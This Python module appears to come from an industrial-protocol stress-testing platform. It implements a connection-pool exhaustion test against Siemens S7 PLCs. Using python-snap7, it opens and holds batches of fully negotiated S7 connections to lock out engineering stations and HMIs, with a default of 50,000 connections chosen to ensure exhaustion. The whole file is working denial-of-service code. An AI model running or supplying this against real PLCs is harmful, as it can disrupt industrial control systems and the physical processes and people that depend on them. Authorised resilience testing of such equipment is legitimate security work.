"""
測項：Siemens S7 Setup Communication 連線池耗盡測試（真實 S7 協定層）
分類：Siemens S7（預設埠 102）
說明：這是 s7/conn_pool_exhaustion.py 模組 docstring 中記載的「未實作、供未來擴充」
     項目的落地實作。既有的 s7/conn_pool_exhaustion.py 只測到純 TCP 三方交握層，
     並未真正完成 S7comm 的連線交握；本測項改用 python-snap7 呼叫
     `Client.connect(address, rack, slot, tcp_port)`，會實際走完：
       1. ISO-on-TCP（RFC1006）COTP Connection Request/Confirm
       2. S7comm PDU「Setup Communication」（協商 PDU 長度等參數）
     這兩層交握完成後，才算是一條「真正」的 S7 連線。真實 S7-300/400/1200/1500
     PLC 對外可同時維持的 S7 連線數都相當有限（依型號/授權不同，常見僅個位數到
     數十條），因此用少量到中量的並行真實 S7 連線即可測出遠比純 TCP flood 更貼近
     實際攻擊面的「S7 連線池耗盡」行為（例如：連線池滿後 PLC 如何處理新請求、
     是否影響既有工程站/HMI 對該 PLC 的正常連線、資源回收是否正常等）。

範圍限制（重要，符合平台安全規則第 4 點）：
     這裡「只」做連線建立並保持（COTP CR + Setup Communication），不呼叫任何
     db_read/db_write/read_area/write_area 等資料存取函式，不讀取、不寫入、不
     觸碰 PLC 的任何記憶體/程式狀態，純粹測 S7 連線層資源本身。

實作方式：採用與本專案其他流量測項一致的「分批 spawn 執行緒 + 保持連線至測試
     結束再統一關閉」模式（見 generic/tcp_conn_flood.py、mqtt/connect_flood.py），
     而非每個連線各自跑「連線-中斷-重連」的無窮迴圈——後者邏輯較複雜、行為較不
     易驗證，因此選擇與既有模式一致、單純且可預期的設計。

Rack/Slot 說明：真實 PLC 需要正確的 rack/slot 才能完成交握，這與 PLC 硬體組態
     有關而非本工具能得知，因此開放為可調參數。常見預設值：S7-1200/1500 為
     rack=0, slot=1；S7-300 系列常見為 rack=0, slot=2；請依實際目標調整，設錯
     rack/slot 通常會讓 connect() 直接失敗（計入 failed 而非造成例外中斷測試）。

限制說明（API 驗證範圍）：本測項呼叫的下列 API 已於 python-snap7 3.1.2 版
     確認存在且簽章相符：
       - snap7.client.Client()
       - Client.connect(address: str, rack: int, slot: int, tcp_port: int = 102)
       - Client.get_connected() -> bool ／ Client.disconnect() ／ Client.destroy()
       - snap7.error.S7ConnectionError（連線失敗時實際觀察到的例外類別）
       - snap7.type.Parameter（PingTimeout/SendTimeout/RecvTimeout 等列舉存在）
     本測項尚未對真實 S7 PLC 硬體做端到端驗證；連線失敗（含 rack/slot 錯誤、
     目標拒絕、逾時等）一律用 `except Exception` 承接、計入 failed 並繼續下一個
     連線嘗試，不會讓單一連線的例外中斷整個測項。
需求套件：pip install python-snap7（該套件另會依平台自動安裝/需要 libsnap7
     動態函式庫，多數發行版可透過官方 release 或套件管理員取得，若載入失敗
     python-snap7 本身會拋出 ImportError/RuntimeError，此處一併以 ImportError
     分支處理並提示使用者安裝）。
"""
import threading
import time

from ..common import clamp_duration

NAME = "Siemens S7 Setup Communication 連線池耗盡測試（真實 S7 協定層）"
CATEGORY = "Siemens S7"
PROTOCOL = "TCP"
DEFAULT_PORT = 102
TEST_TYPE = "resource"  # 建立並保持大量「真正完成 COTP+Setup Communication 交握」的 S7 連線，屬連線池飽和攻擊

_SPAWN_BATCH_SIZE = 25
_SPAWN_BATCH_STAGGER_SEC = 0.1


def get_param_schema() -> dict:
    return {
        "concurrent_connections": {
            "type": "int", "default": 50000, "min": 1, "max": 50000,
            "desc": "同時建立並保持的真實 S7 連線數（攻擊端以分批方式建立；真實 PLC 可同時維持的"
                    "S7 連線數通常遠低於此上限，個位數到數十條即可打滿連線池，預設值刻意拉高"
                    "以確保能有感地耗盡目標）",
        },
        "rack": {
            "type": "int", "default": 0, "min": 0, "max": 7,
            "desc": "S7 Rack 編號，需與實際 PLC 硬體組態相符（S7-1200/1500 常見為 0）",
        },
        "slot": {
            "type": "int", "default": 1, "min": 0, "max": 31,
            "desc": "S7 Slot 編號，需與實際 PLC 硬體組態相符（S7-1200/1500 常見為 1，S7-300 常見為 2）",
        },
        "connect_timeout_sec": {
            "type": "float", "default": 3.0, "min": 0.5, "max": 10.0,
            "desc": "單一連線建立的逾時秒數（同時套用到 snap7 PingTimeout/SendTimeout/RecvTimeout）",
        },
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        import snap7
        from snap7.type import Parameter
    except ImportError:
        log_fn("[!] 未安裝 python-snap7，請先執行 pip install python-snap7"
               "（另需系統可用的 libsnap7 動態函式庫）")
        return {"opened": 0, "failed": 0, "error": "python-snap7 not installed"}

    duration = clamp_duration(duration)
    n = int(params.get("concurrent_connections", 250))
    rack = int(params.get("rack", 0))
    slot = int(params.get("slot", 1))
    timeout_sec = float(params.get("connect_timeout_sec", 3.0))
    timeout_ms = max(1, int(timeout_sec * 1000))
    tcp_port = int(port) if port else DEFAULT_PORT

    clients = []
    lock = threading.Lock()
    stats = {"ok": 0, "fail": 0}
    error_logged = 0

    def open_one():
        nonlocal error_logged
        client = snap7.client.Client()
        try:
            # 設定較短的 timeout，避免目標無回應時單一連線嘗試卡住太久，
            # 影響整體 spawn 進度與收尾速度；部分版本/環境可能不支援其中
            # 某幾個 Parameter 欄位，個別失敗不影響整體流程。
            for param in (Parameter.PingTimeout, Parameter.SendTimeout, Parameter.RecvTimeout):
                try:
                    client.set_param(param, timeout_ms)
                except Exception:  # noqa: BLE001
                    pass
            client.connect(target, rack, slot, tcp_port)
            with lock:
                clients.append(client)
                stats["ok"] += 1
        except Exception as e:  # noqa: BLE001  連線拒絕/逾時/rack-slot 錯誤等都算失敗，不中斷其他連線
            with lock:
                stats["fail"] += 1
            if error_logged < 5:
                error_logged += 1
                log_fn(f"[!] S7 連線失敗：{e}")
            try:
                client.destroy()
            except Exception:  # noqa: BLE001
                pass

    log_fn(
        f"[+] 嘗試建立 {n} 條真實 S7 連線（COTP CR + Setup Communication）"
        f"-> {target}:{tcp_port}，rack={rack}, slot={slot}（分批 spawn，每批 {_SPAWN_BATCH_SIZE} 條）"
    )
    threads = []
    for batch_start in range(0, n, _SPAWN_BATCH_SIZE):
        if stop_event is not None and stop_event.is_set():
            log_fn("[!] stop_event 觸發，停止繼續建立新連線")
            break
        batch = [
            threading.Thread(target=open_one, daemon=True)
            for _ in range(min(_SPAWN_BATCH_SIZE, n - batch_start))
        ]
        for t in batch:
            t.start()
        threads.extend(batch)
        if batch_start + _SPAWN_BATCH_SIZE < n:
            time.sleep(_SPAWN_BATCH_STAGGER_SEC)
    for t in threads:
        t.join(timeout=timeout_sec + 2)

    log_fn(f"[+] 成功建立 {stats['ok']} 條 S7 連線，失敗 {stats['fail']} 條，維持連線至測試結束或被停止")

    start = time.time()
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        time.sleep(1)

    log_fn("[+] 關閉所有 S7 連線")
    for client in clients:
        try:
            client.disconnect()
        except Exception:  # noqa: BLE001
            pass
        try:
            client.destroy()
        except Exception:  # noqa: BLE001
            pass

    return {
        "opened": stats["ok"],
        "failed": stats["fail"],
        "elapsed_sec": round(time.time() - start, 1),
    }
